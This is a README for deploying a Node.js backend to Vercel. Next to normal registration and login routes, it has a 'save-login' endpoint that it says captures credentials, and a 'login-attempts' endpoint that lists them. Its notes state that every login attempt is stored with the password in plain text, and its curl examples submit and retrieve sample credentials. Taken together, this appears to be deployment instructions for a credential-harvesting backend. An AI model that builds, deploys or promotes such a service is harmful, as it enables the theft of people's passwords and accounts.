# Database Server - Vercel Deployment

## Project Structure

```
database/
├── api/
│   ├── health.js           # GET /api/health
│   ├── register.js         # POST /api/register
│   ├── login.js           # POST /api/login
│   ├── save-login.js      # POST /api/save-login
│   ├── login-attempts.js  # GET /api/login-attempts
│   └── init-db.js         # GET/POST /api/init-db
├── .env.template          # Environment variables template
├── vercel.json           # Vercel configuration
├── package.json          # Dependencies
└── VERCEL_DEPLOYMENT.md  # This file
```

## API Endpoints

- **GET** `/api/health` - Health check
- **POST** `/api/register` - User registration
- **POST** `/api/login` - User authentication
- **POST** `/api/save-login` - Save login attempts (captures credentials)
- **GET** `/api/login-attempts` - View captured login attempts
- **GET/POST** `/api/init-db` - Initialize database tables

## Setup Instructions

### 1. Install Dependencies
```bash
npm install
```

### 2. Local Development
```bash
vercel dev
```
Runs on `http://localhost:3000`

### 3. Deploy to Vercel

#### Option A: Using Vercel CLI
```bash
npm install -g vercel
vercel login
vercel
```

#### Option B: Using GitHub
1. Push to GitHub
2. Import in Vercel dashboard
3. Auto-deploys on push

### 4. Set Environment Variables in Vercel

**Required Variables:**
- `DATABASE_URL` - PostgreSQL connection string
- `BCRYPT_ROUNDS` - Password hashing rounds (default: 10)
- `NODE_ENV` - Set to "production"

**Example DATABASE_URL formats:**
- Neon: `postgresql://user:pass@ep-xxx.us-east-1.aws.neon.tech/dbname?sslmode=require`
- Supabase: `postgresql://postgres:pass@db.xxx.supabase.co:5432/postgres`
- ElephantSQL: `postgres://user:pass@raja.db.elephantsql.com/database`

### 5. Initialize Database
After deployment, visit: `https://your-project.vercel.app/api/init-db`

## Database Providers

**Free PostgreSQL Options:**
- **Neon** (recommended) - 512MB free
- **Supabase** - 500MB free
- **ElephantSQL** - 20MB free
- **Railway** - $5/month

## Important Notes

- All login attempts are captured and stored
- Passwords are stored in plain text in login_attempts table
- User registration uses bcrypt hashing
- 10-second timeout limit on Vercel
- SSL required for online databases

## Testing Endpoints

```bash
# Health check
curl https://your-project.vercel.app/api/health

# Initialize database
curl https://your-project.vercel.app/api/init-db

# Save login attempt
curl -X POST https://your-project.vercel.app/api/save-login \
  -H "Content-Type: application/json" \
  -d '{"emailOrUsername":"test@example.com","password":"password123"}'

# View attempts
curl https://your-project.vercel.app/api/login-attempts
```